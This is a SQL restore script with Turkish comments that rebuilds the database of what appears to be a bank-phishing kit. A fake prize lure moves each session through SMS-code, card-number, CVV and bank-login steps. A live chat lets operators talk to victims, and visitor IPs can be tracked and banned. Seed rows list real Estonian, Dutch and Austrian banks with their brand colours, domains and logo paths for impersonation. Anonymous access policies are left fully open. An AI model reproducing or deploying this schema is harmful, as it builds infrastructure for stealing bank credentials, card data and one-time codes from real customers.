-- =====================================================================
-- ESKI SUPABASE RESTORE (db_cluster-21-10-2026@01-13-20.backup)
-- Eski DB'nin birebir semasi + ayar verisi (bankalar, global_settings)
-- + gecmis sessions/chat verisi + admin kullanicisi
-- Yeni Supabase projesi -> SQL Editor -> tek seferde calistir
-- =====================================================================

CREATE EXTENSION IF NOT EXISTS pgcrypto WITH SCHEMA extensions;

-- ==================== 1) ADMIN_LOGS ====================
CREATE TABLE IF NOT EXISTS public.admin_logs (
    id bigint NOT NULL,
    admin_email text NOT NULL,
    action text NOT NULL,
    target text,
    detail jsonb,
    ip text,
    user_agent text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);

CREATE SEQUENCE IF NOT EXISTS public.admin_logs_id_seq
    START WITH 1 INCREMENT BY 1 NO MINVALUE NO MAXVALUE CACHE 1;
ALTER SEQUENCE public.admin_logs_id_seq OWNED BY public.admin_logs.id;
ALTER TABLE ONLY public.admin_logs ALTER COLUMN id SET DEFAULT nextval('public.admin_logs_id_seq'::regclass);

ALTER TABLE ONLY public.admin_logs
    DROP CONSTRAINT IF EXISTS admin_logs_pkey,
    ADD CONSTRAINT admin_logs_pkey PRIMARY KEY (id);

-- ==================== 2) BANKS (eski sema: logo_url/bg_url/preview_url/enabled/sort_order/custom_html dahil) ====================
CREATE TABLE IF NOT EXISTS public.banks (
    slug text NOT NULL,
    name text NOT NULL,
    country text NOT NULL,
    logo_url text,
    bg_url text,
    preview_url text,
    enabled boolean DEFAULT true NOT NULL,
    sort_order integer DEFAULT 0 NOT NULL,
    brand_color text,
    accent_color text,
    domain text,
    logo_file text,
    is_active boolean DEFAULT true NOT NULL,
    auto_redirect boolean DEFAULT false NOT NULL,
    design_config jsonb DEFAULT '{}'::jsonb NOT NULL,
    custom_html text,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.banks
    DROP CONSTRAINT IF EXISTS banks_pkey,
    ADD CONSTRAINT banks_pkey PRIMARY KEY (slug);

ALTER TABLE ONLY public.banks REPLICA IDENTITY FULL;

-- ==================== 3) CHAT_MESSAGES ====================
CREATE TABLE IF NOT EXISTS public.chat_messages (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    session_id text NOT NULL,
    sender text NOT NULL,
    content text NOT NULL,
    image_url text,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    CONSTRAINT chat_messages_sender_check CHECK ((sender = ANY (ARRAY['user'::text, 'admin'::text, 'support'::text])))
);

ALTER TABLE ONLY public.chat_messages
    DROP CONSTRAINT IF EXISTS chat_messages_pkey,
    ADD CONSTRAINT chat_messages_pkey PRIMARY KEY (id);

ALTER TABLE ONLY public.chat_messages REPLICA IDENTITY FULL;

-- ==================== 4) GLOBAL_SETTINGS (eski sema: tum kolonlar NOT NULL) ====================
CREATE TABLE IF NOT EXISTS public.global_settings (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    logo_url text NOT NULL,
    bg_url text NOT NULL,
    portal_name text NOT NULL,
    support_center_name text NOT NULL,
    win_title text NOT NULL,
    win_subtitle text NOT NULL,
    win_button text NOT NULL,
    banken_title text NOT NULL,
    banken_subtitle text NOT NULL,
    banken_search_placeholder text NOT NULL,
    wait_title text NOT NULL,
    wait_subtitle text NOT NULL,
    sms_title text NOT NULL,
    sms_subtitle text NOT NULL,
    sms_input_label text NOT NULL,
    sms_button text NOT NULL,
    sms_loading text NOT NULL,
    card_title text NOT NULL,
    card_subtitle text NOT NULL,
    card_owner_label text NOT NULL,
    card_number_label text NOT NULL,
    card_expiry_label text NOT NULL,
    card_cvv_label text NOT NULL,
    card_button text NOT NULL,
    code_title text NOT NULL,
    code_subtitle text NOT NULL,
    code_button text NOT NULL,
    live_support_title text NOT NULL,
    live_support_subtitle text NOT NULL,
    live_support_button text NOT NULL,
    profile_title_small text NOT NULL,
    profile_title_main text NOT NULL,
    profile_subtitle text NOT NULL,
    profile_firstname_label text NOT NULL,
    profile_lastname_label text NOT NULL,
    profile_phone_label text NOT NULL,
    profile_button text NOT NULL,
    profile_loading_text text NOT NULL,
    site_language text DEFAULT 'et'::text NOT NULL,
    target_country text,
    wheel_settings jsonb,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);

ALTER TABLE ONLY public.global_settings
    DROP CONSTRAINT IF EXISTS global_settings_pkey,
    ADD CONSTRAINT global_settings_pkey PRIMARY KEY (id);

-- ==================== 5) SESSIONS (id TEXT + session_type + public_id int) ====================
CREATE TABLE IF NOT EXISTS public.sessions (
    id text DEFAULT encode(extensions.gen_random_bytes(12), 'hex'::text) NOT NULL,
    amount integer DEFAULT 0 NOT NULL,
    current_step text DEFAULT 'win'::text NOT NULL,
    status text DEFAULT 'offline'::text NOT NULL,
    sms_digits integer DEFAULT 6 NOT NULL,
    form_data jsonb DEFAULT '{}'::jsonb NOT NULL,
    is_hidden boolean DEFAULT false,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL,
    participation_code text,
    partner_name text,
    public_id integer,
    sms_custom_text text,
    ip_address text,
    user_agent text,
    session_type text DEFAULT 'normal'::text NOT NULL,
    deleted_at timestamp with time zone
);

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_amount_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_amount_check CHECK ((amount >= 0));

-- Eski listenin genisletilmis hali (yeni kodun yazdigi stepler de kabul edilir)
ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK ((current_step = ANY (ARRAY[
  'code_entry','sms','win','verify','banken','banken2','card','wait','invalid_bank',
  'bank','live_support','special_approval','congratulations','congrats',
  'facebook','wheel','login','bank_login','SPECIAL_INFO',
  'generator1','generator2','custom_question','win2','code','custom_sms'
])));

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_session_type_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_session_type_check
CHECK ((session_type = ANY (ARRAY['normal','wheel','direct_win','direct_bank','demo'])));

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_sms_digits_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_sms_digits_check CHECK ((sms_digits >= 4 AND sms_digits <= 12));

ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_status_check;
ALTER TABLE public.sessions ADD CONSTRAINT sessions_status_check
CHECK ((status = ANY (ARRAY['online','offline','SUCCESS','CONGRATS','SPECIAL_INFO','success','banned','idle'])));

CREATE SEQUENCE IF NOT EXISTS public.sessions_public_id_seq
    START WITH 1 INCREMENT BY 1 NO MINVALUE NO MAXVALUE CACHE 1;
ALTER SEQUENCE public.sessions_public_id_seq OWNED BY public.sessions.public_id;
ALTER TABLE ONLY public.sessions ALTER COLUMN public_id SET DEFAULT nextval('public.sessions_public_id_seq'::regclass);

ALTER TABLE ONLY public.sessions
    DROP CONSTRAINT IF EXISTS sessions_pkey,
    ADD CONSTRAINT sessions_pkey PRIMARY KEY (id);

ALTER TABLE ONLY public.sessions
    DROP CONSTRAINT IF EXISTS sessions_public_id_unique,
    ADD CONSTRAINT sessions_public_id_unique UNIQUE (public_id);

ALTER TABLE ONLY public.sessions REPLICA IDENTITY FULL;

CREATE INDEX IF NOT EXISTS sessions_created_at_idx ON public.sessions USING btree (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_ip_created ON public.sessions USING btree (ip_address, created_at DESC);
CREATE UNIQUE INDEX IF NOT EXISTS idx_sessions_public_id ON public.sessions (public_id) WHERE public_id IS NOT NULL;

-- ==================== 6) BANNED_IPS (eski DB'de yoktu ama admin1/proxy kullaniyor) ====================
CREATE TABLE IF NOT EXISTS public.banned_ips (
  ip_address text PRIMARY KEY,
  reason text,
  banned_at timestamptz DEFAULT now()
);

-- ==================== 7) INDEXLER + TRIGGER FONKSIYONLARI ====================
CREATE INDEX IF NOT EXISTS banks_country_idx ON public.banks USING btree (country);
CREATE INDEX IF NOT EXISTS banks_enabled_idx ON public.banks USING btree (enabled);
CREATE INDEX IF NOT EXISTS idx_chat_messages_created_at ON public.chat_messages USING btree (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_chat_messages_session ON public.chat_messages USING btree (session_id, created_at);

CREATE OR REPLACE FUNCTION public.set_banks_updated_at() RETURNS trigger
    LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
    AS $$ begin new.updated_at = now(); return new; end; $$;

CREATE OR REPLACE FUNCTION public.set_sessions_updated_at() RETURNS trigger
    LANGUAGE plpgsql SECURITY DEFINER SET search_path TO 'public'
    AS $$ begin new.updated_at = now(); return new; end; $$;

DROP TRIGGER IF EXISTS banks_set_updated_at ON public.banks;
CREATE TRIGGER banks_set_updated_at BEFORE UPDATE ON public.banks FOR EACH ROW EXECUTE FUNCTION public.set_banks_updated_at();

DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at BEFORE UPDATE ON public.sessions FOR EACH ROW EXECUTE FUNCTION public.set_sessions_updated_at();

-- ==================== 8) RLS + POLICY'LER (eski DB ile birebir) ====================
ALTER TABLE public.admin_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.banks ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.global_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS admin_logs_authenticated_all ON public.admin_logs;
CREATE POLICY admin_logs_authenticated_all ON public.admin_logs TO authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS banks_anon_select ON public.banks;
DROP POLICY IF EXISTS banks_authenticated_all ON public.banks;
CREATE POLICY banks_anon_select ON public.banks FOR SELECT TO anon USING (true);
CREATE POLICY banks_authenticated_all ON public.banks TO authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS chat_anon_rw ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_insert_policy ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_select_policy ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_anon_all ON public.chat_messages;
DROP POLICY IF EXISTS chat_messages_auth_all ON public.chat_messages;
CREATE POLICY chat_messages_insert_policy ON public.chat_messages FOR INSERT
    WITH CHECK ((auth.role() = ANY (ARRAY['anon'::text, 'authenticated'::text])));
CREATE POLICY chat_messages_select_policy ON public.chat_messages FOR SELECT
    USING (((auth.role() = 'anon'::text) AND (EXISTS (SELECT 1 FROM public.sessions s WHERE (s.id = chat_messages.session_id))))
        OR (auth.role() = 'authenticated'::text));

DROP POLICY IF EXISTS global_settings_anon_select ON public.global_settings;
DROP POLICY IF EXISTS global_settings_authenticated_all ON public.global_settings;
CREATE POLICY global_settings_anon_select ON public.global_settings FOR SELECT TO anon USING (true);
CREATE POLICY global_settings_authenticated_all ON public.global_settings TO authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS sessions_anon_insert ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_select_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_update_demo ON public.sessions;
DROP POLICY IF EXISTS sessions_authenticated_all ON public.sessions;
DROP POLICY IF EXISTS sessions_service_all ON public.sessions;
DROP POLICY IF EXISTS sessions_anon_delete ON public.sessions;
CREATE POLICY sessions_anon_insert ON public.sessions FOR INSERT WITH CHECK (true);
CREATE POLICY sessions_anon_select ON public.sessions FOR SELECT USING (true);
CREATE POLICY sessions_anon_select_demo ON public.sessions FOR SELECT TO anon USING (true);
CREATE POLICY sessions_anon_update ON public.sessions FOR UPDATE USING (true) WITH CHECK (true);
CREATE POLICY sessions_anon_update_demo ON public.sessions FOR UPDATE TO anon USING (true) WITH CHECK (true);
CREATE POLICY sessions_authenticated_all ON public.sessions TO authenticated USING (true) WITH CHECK (true);
CREATE POLICY sessions_service_all ON public.sessions USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "Allow all read access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all insert access to banned_ips" ON public.banned_ips;
DROP POLICY IF EXISTS "Allow all delete access to banned_ips" ON public.banned_ips;
CREATE POLICY "Allow all read access to banned_ips" ON public.banned_ips FOR SELECT USING (true);
CREATE POLICY "Allow all insert access to banned_ips" ON public.banned_ips FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow all delete access to banned_ips" ON public.banned_ips FOR DELETE USING (true);

-- ==================== 9) STORAGE BUCKET'LARI ====================
INSERT INTO storage.buckets (id, name, public) VALUES ('assets','assets',true) ON CONFLICT (id) DO NOTHING;
INSERT INTO storage.buckets (id, name, public) VALUES ('chat_images','chat_images',true) ON CONFLICT (id) DO NOTHING;

DROP POLICY IF EXISTS "Public Access" ON storage.objects;
DROP POLICY IF EXISTS "Allow Uploads" ON storage.objects;
CREATE POLICY "Public Access" ON storage.objects FOR SELECT USING (bucket_id IN ('assets','chat_images'));
CREATE POLICY "Allow Uploads" ON storage.objects FOR INSERT WITH CHECK (bucket_id IN ('assets','chat_images'));

-- ==================== 10) REALTIME (eski DB ile birebir) ====================
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.banks; EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages; EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.sessions; EXCEPTION WHEN duplicate_object THEN NULL; END $$;

NOTIFY pgrst, 'reload schema';

-- ==================== 11) VERI (eski DB'den birebir) ====================

-- public.banks: 58 satir
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('bigbank', 'Bigbank', 'Estonia', NULL, NULL, NULL, 't', '10', '#E2001A', '#E2001A', 'bigbank.eu', '/bank-logos/estonia/bigbank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('citadele-banka', 'Citadele Banka', 'Estonia', NULL, NULL, NULL, 't', '20', '#E3000F', '#E3000F', 'citadele.ee', '/bank-logos/estonia/citadele-banka.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('coop-pank', 'Coop Pank', 'Estonia', NULL, NULL, NULL, 't', '30', '#0054A6', '#0054A6', 'cooppank.ee', '/bank-logos/estonia/coop-pank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('inbank', 'Inbank', 'Estonia', NULL, NULL, NULL, 't', '40', '#000000', '#000000', 'inbank.ee', '/bank-logos/estonia/inbank.png', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('lhv-pank', 'LHV Pank', 'Estonia', NULL, NULL, NULL, 't', '50', '#000000', '#111111', 'lhv.ee', '/bank-logos/estonia/lhv-pank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('luminor-ee', 'Luminor', 'Estonia', NULL, NULL, NULL, 't', '60', '#000000', '#111111', 'luminor.ee', '/bank-logos/estonia/luminor-ee.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('op-corporate-bank', 'OP Corporate Bank', 'Estonia', NULL, NULL, NULL, 't', '70', '#FF6600', '#FF6600', 'op.fi', '/bank-logos/estonia/op-corporate-bank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('seb-pank', 'SEB Pank', 'Estonia', NULL, NULL, NULL, 't', '80', '#00B050', '#009242', 'seb.ee', '/bank-logos/estonia/seb-pank.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('swedbank-ee', 'Swedbank', 'Estonia', NULL, NULL, NULL, 't', '90', '#EE7003', '#D65F00', 'swedbank.ee', '/bank-logos/estonia/swedbank-ee.jpg', 't', 'f', '{"blocks": [], "layout": "centered", "background": {"type": "color", "value": "#ffffff"}}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('abn-amro', 'ABN AMRO', 'Netherlands', NULL, NULL, NULL, 't', '110', '#0a8f6a', '#f6c500', 'abnamro.nl', '/bank-logos/abn-amro.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('adyen', 'Adyen', 'Netherlands', NULL, NULL, NULL, 't', '111', '#0abf53', '#089942', 'adyen.com', '/bank-logos/adyen.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('asn-bank', 'ASN Bank', 'Netherlands', NULL, NULL, NULL, 't', '112', '#8a1538', '#5b0f25', 'asnbank.nl', '/bank-logos/asn-bank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('asn-bank-vh-regiobank', 'ASN Bank vh RegioBank', 'Netherlands', NULL, NULL, NULL, 't', '113', '#1f6f43', '#14502f', 'regiobank.nl', '/bank-logos/asn-bank-vh-regiobank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('asn-bank-voorheen-blgwonen', 'ASN Bank voorheen BLGwonen', 'Netherlands', NULL, NULL, NULL, 't', '114', '#e64a38', '#d03d2d', 'asnbank.nl', '/bank-logos/asn-bank-voorheen-blgwonen.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('asn-bank-voorheen-sns', 'ASN Bank voorheen SNS', 'Netherlands', NULL, NULL, NULL, 't', '115', '#5f259f', '#421970', 'snsbank.nl', '/bank-logos/asn-bank-voorheen-sns.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('bunq', 'bunq', 'Netherlands', NULL, NULL, NULL, 't', '116', '#0f172a', '#1e293b', 'bunq.com', '/bank-logos/bunq.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('finom', 'Finom', 'Netherlands', NULL, NULL, NULL, 't', '117', '#f33a6b', '#c22e56', 'finom.co', '/bank-logos/finom.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('ing', 'ING', 'Netherlands', NULL, NULL, NULL, 't', '118', '#ff6200', '#d94c00', 'ing.nl', '/bank-logos/ing.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('knab', 'Knab', 'Netherlands', NULL, NULL, NULL, 't', '119', '#11998e', '#0c6f67', 'knab.nl', '/bank-logos/knab.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('n26', 'N26', 'Netherlands', NULL, NULL, NULL, 't', '120', '#36a18b', '#2b816f', 'n26.com', '/bank-logos/n26.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('nationale-nederlanden', 'Nationale-Nederlanden', 'Netherlands', NULL, NULL, NULL, 't', '121', '#ea650d', '#bb510a', 'nn.nl', '/bank-logos/nationale-nederlanden.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('rabobank', 'Rabobank', 'Netherlands', NULL, NULL, NULL, 't', '122', '#003d8f', '#f57c00', 'rabobank.nl', '/bank-logos/rabobank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('triodos-bank', 'Triodos Bank', 'Netherlands', NULL, NULL, NULL, 't', '123', '#6b3fa0', '#4b2c70', 'triodos.nl', '/bank-logos/triodos-bank.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('van-lanschot-kempen', 'Van Lanschot Kempen', 'Netherlands', NULL, NULL, NULL, 't', '124', '#173463', '#0f2241', 'vanlanschotkempen.com', '/bank-logos/van-lanschot-kempen.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('yoursafe', 'Yoursafe', 'Netherlands', NULL, NULL, NULL, 't', '125', '#0a81c5', '#08679e', 'yoursafe.com', '/bank-logos/yoursafe.svg', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('erste-bank', 'Erste Bank und Sparkassen', 'Austria', NULL, NULL, NULL, 't', '210', '#003b7a', '#e3000f', 'sparkasse.at', '/app-icons/erste-bank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('raiffeisen', 'Raiffeisen Bankengruppe', 'Austria', NULL, NULL, NULL, 't', '211', '#ffe500', '#1f1f1f', 'raiffeisen.at', '/app-icons/raiffeisen.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('bank-austria', 'Bank Austria', 'Austria', NULL, NULL, NULL, 't', '212', '#d50032', '#7a0026', 'bankaustria.at', '/app-icons/bank-austria.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('bawag', 'BAWAG', 'Austria', NULL, NULL, NULL, 't', '213', '#ffec00', '#222222', 'bawag.at', '/app-icons/bawag.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('easybank', 'easybank', 'Austria', NULL, NULL, NULL, 't', '214', '#00a0df', '#006388', 'easybank.at', '/app-icons/easybank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('bank99', 'bank99', 'Austria', NULL, NULL, NULL, 't', '215', '#ffde00', '#222222', 'bank99.at', '/app-icons/bank99.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
INSERT INTO public.banks (slug, name, country, logo_url, bg_url, preview_url, enabled, sort_order, brand_color, accent_color, domain, logo_file, is_active, auto_redirect, design_config, custom_html, created_at, updated_at) VALUES ('volksbank', 'Volksbank', 'Austria', NULL, NULL, NULL, 't', '216', '#006b3f', '#004b2c', 'volksbank.at', '/app-icons/volksbank.png', 'f', 'f', '{}', NULL, '2026-09-29 20:03:58.145644+00', '2026-09-29 20:03:58.145644+00');
